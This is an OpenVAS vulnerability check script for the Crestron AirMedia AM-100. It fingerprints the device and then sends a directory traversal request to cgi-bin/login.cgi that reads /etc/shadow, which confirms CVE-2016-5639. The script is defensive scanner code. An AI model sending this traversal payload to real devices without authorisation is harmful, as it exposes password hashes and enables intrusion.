##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_crestron_mult_vuln.nasl 11949 2018-10-18 06:44:50Z cfischer $
#
# Crestron AirMedia AM-100 Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106410");
  script_version("$Revision: 11949 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 08:44:50 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-11-23 12:47:24 +0700 (Wed, 23 Nov 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2016-5639", "CVE-2016-5640");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Crestron AirMedia AM-100 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_lighttpd_detect.nasl");
  script_mandatory_keys("lighttpd/installed");

  script_tag(name:"summary", value:"Crestron AirMedia AM-100 is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to conduct a directory traversal attack.");

  script_tag(name:"insight", value:"Crestron AirMedia AM-100 is prone to multiple vulnerabilities:

  - Directory traversal vulnerability in cgi-bin/login.cgi.

  - Hidden Management Console with hardcoded default credentials

  - Hardcoded credentials.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary system files or login
  with hardcoded credentials.");

  script_tag(name:"affected", value:"Firmware Versions v1.1.1.11 - v1.2.1.");

  script_tag(name:"solution", value:"Update to version 1.4.0.13 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40813/");
  script_xref(name:"URL", value:"https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md");
  script_xref(name:"URL", value:"https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: "cpe:/a:lighttpd:lighttpd"))
  exit(0);

url = "/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if ("<title>Crestron AirMedia</title>" >< res && "Device Administration" >< res &&
    "Download AirMedia Utility Software" >< res) {
  trav = "/cgi-bin/login.cgi?lang=en&src=../../../../../../../../../../../../../../../../../../../../etc/shadow";
  if (http_vuln_check(port: port, url: trav, pattern: "root:.*:0:0:99999:7:::", check_header: TRUE)) {
    report = report_vuln_url(port: port, url: trav);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);